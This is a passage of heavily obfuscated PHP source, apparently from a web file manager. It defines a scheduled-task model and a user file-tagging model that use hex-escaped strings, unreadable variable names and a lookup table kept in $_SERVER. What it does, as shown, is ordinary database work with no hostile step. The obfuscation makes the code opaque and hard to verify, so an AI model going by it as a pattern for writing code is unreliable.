"\x53\171\163\x74\145\x6d\56\164\141\163\x6b\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\164\171\160\x65", "\145\166\x65\x6e\x74", "\164\151\x6d\x65", "\x64\145\x73\x63", "\163\x79\163\x74\145\x6d", "\145\x6e\141\142\x6c\145", "\154\141\x73\x74\122\x75\x6e", "\x73\x6f\x72\x74"); public function listData($Îæ›³˜¢ = false, $ûü˜°Ñ‚ = "\x73\x6f\162\x74", $Şù¤ÄÂÒ = false) { return parent::listData($Îæ›³˜¢, $ûü˜°Ñ‚, $Şù¤ÄÂÒ); } public function add($†ßò»ÛÕ) { $°ÙÚáø =& $_SERVER[³Ôà×Ó]; $”÷äèúø = $this->findByName($†ßò»ÛÕ[$°ÙÚáø[32]]); if ($”÷äèúø) { return !1; } $†ßò»ÛÕ[$°ÙÚáø[1716]] = 0; $†ßò»ÛÕ[$°ÙÚáø[1987]] = $this->getSort(); return parent::insert($†ßò»ÛÕ); } private function getSort() { $ˆŒš¸ì =& $_SERVER[³Ôà×Ó]; $ğÈ¥óì‚ = parent::listData(); $ËÏ¢Úéˆ = array_to_keyvalue($ğÈ¥óì‚, $ˆŒš¸ì[12], $ˆŒš¸ì[1987]); return empty($ËÏ¢Úéˆ) ? 0 : max($ËÏ¢Úéˆ) + 1; } public function update($¤ëã¯ï, $¨ñ¡ı¬é) { $Ş³œöûË =& $_SERVER[³Ôà×Ó]; $ê“„ğµ = $this->listData($¤ëã¯ï); $ğÇ•¸Ÿà = $this->findByName($¨ñ¡ı¬é[$Ş³œöûË[32]]); if (!$ê“„ğµ || $ğÇ•¸Ÿà && $ğÇ•¸Ÿà[$Ş³œöûË[484]] != $ê“„ğµ[$Ş³œöûË[484]]) { return !1; } return parent::update($¤ëã¯ï, $¨ñ¡ı¬é); } public function remove($¹¼¥Ôòş, $Ïùäõ—Ì = false) { $¦Éè×©ç =& $_SERVER[³Ôà×Ó]; $™ıé‡Î  = $this->listData($¹¼¥Ôòş); if (!$™ıé‡Î ) { return; } if (!$Ïùäõ—Ì && $™ıé‡Î [$¦Éè×©ç[191]] == $¦Éè×©ç[91]) { return !1; } return parent::remove($¹¼¥Ôòş); } public function enable($°²Ãå’ß, $«›•‹‰î) { return $this->update($°²Ãå’ß, array($_SERVER[³Ôà×Ó][2426] => $«›•‹‰î)); } public function run($€ï’‹³‘) { return $this->update($€ï’‹³‘, array($_SERVER[³Ôà×Ó][2438] => time())); } } goto a„‘ŞŠ§ğ•; cƒ¶ŠÍÀÁ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($•ô€ÑÕ¨) { $¥Å’—ğ =& $_SERVER[³Ôà×Ó]; return array($¥Å’—ğ[2078] => array($¥Å’—ğ[2492] . USER_ID, $¥Å’—ğ[2079])); } protected function listData() { $ÖãÍ›Ò¯ =& $_SERVER[³Ôà×Ó]; $şË´ó£Ù = array($ÖãÍ›Ò¯[1756] => USER_ID, $ÖãÍ›Ò¯[566] => array($ÖãÍ›Ò¯[2082], 0)); $¤ê¹’ = $ÖãÍ›Ò¯[2493]; $½ÈÜÌ¢ª = $this->field($¤ê¹’)->where($şË´ó£Ù)->order($ÖãÍ›Ò¯[2085])->select(); return $½ÈÜÌ¢ª ? $½ÈÜÌ¢ª : array(); } protected function addToTag($÷ßäÄéã, $©µ‹ıû‰) { $Ø«Ş­ä… =& $_SERVER[³Ôà×Ó]; if (!Model($Ø«Ş­ä…[2229])->listData($©µ‹ıû‰)) { return !1; } if (is_numeric($÷ßäÄéã)) { $¡²«¬ÛÙ = Model($Ø«Ş­ä…[899])->pathInfo($÷ßäÄéã); if (!$¡²«¬ÛÙ) { return !1; } } else { $¡²«¬ÛÙ = IO::infoSimple($÷ßäÄéã); if (!$¡²«¬ÛÙ) { return !1; } $Ÿ’›Í’¹ = $¡²«¬ÛÙ[$Ø«Ş­ä…[32]]; $×ú—ôÒ· = $¡²«¬ÛÙ[$Ø«Ş­ä…[33]]; if (isset($¡²«¬ÛÙ[$Ø«Ş­ä…[494]])) { $×ú—ôÒ· = $¡²«¬ÛÙ[$Ø«Ş­ä…[494]] == $Ø«Ş­ä…[91] ? $Ø«Ş­ä…[78] : $Ø«Ş­ä…[230]; } } $ˆÛíÂ¤ƒ = array($Ø«Ş­ä…[1756] => USER_ID, $Ø«Ş­ä…[566] => $©µ‹ıû‰, $Ø«Ş­ä…[504] => $÷ßäÄéã, $Ø«Ş­ä…[505] => $×ú—ôÒ· ? $×ú—ôÒ· : $Ø«Ş­ä…[499], $Ø«Ş­ä…[503] => $Ÿ’›Í’¹ ? $Ÿ’›Í’¹ : $Ø«Ş­ä…[12], $Ø«Ş­ä…[1967] => 0); if ($this->where($ˆÛíÂ¤ƒ)->find()) { return !1; } return $this->add($ˆÛíÂ¤ƒ); } protected function removeFromTag($í³•Æ€, $Ÿù¿ƒª) { $®ÎèÊÌì =& $_SERVER[³Ôà×Ó]; if (!Model($®ÎèÊÌì[2229])->listData($Ÿù¿ƒª)) { return !1; } if (is_array($í³•Æ€)) { $í³•Æ€ = array($®ÎèÊÌì[7], $í³•Æ€); } $¸²‚ËÓÇ = array($®ÎèÊÌì[1756] => USER_ID, $®ÎèÊÌì[566] => $Ÿù¿ƒª, $®ÎèÊÌì[504] => $í³•Æ€); return $this->where($¸²‚ËÓÇ)->delete(); } protected function removeByTag($ã»¤åùâ) { $ôÍòøøµ =& $_SERVER[³Ôà×Ó]; if (!$ã»¤åùâ) { return !1; } $Ÿ–›ç† = array($ôÍòøøµ[1756] => USER_ID, $ôÍòøøµ[566] => $ã»¤åùâ); return $this->where($Ÿ–›ç†)->delete(); } protected function removeBySource($îÕÈ—Ğ) { $„¼ŠÌÈÊ =& $_SERVER[³Ôà×Ó]; if (is_array($îÕÈ—Ğ)) { $îÕÈ—Ğ = array($„¼ŠÌÈÊ[7], $îÕÈ—Ğ); } $øê€’ì = array($„¼ŠÌÈÊ[1756] => USER_ID, $„¼ŠÌÈÊ[566] => array($„¼ŠÌÈÊ[1089], 0), $„¼ŠÌÈÊ[504] => $îÕÈ—Ğ); return $this->where($øê€’ì)->delete(); } }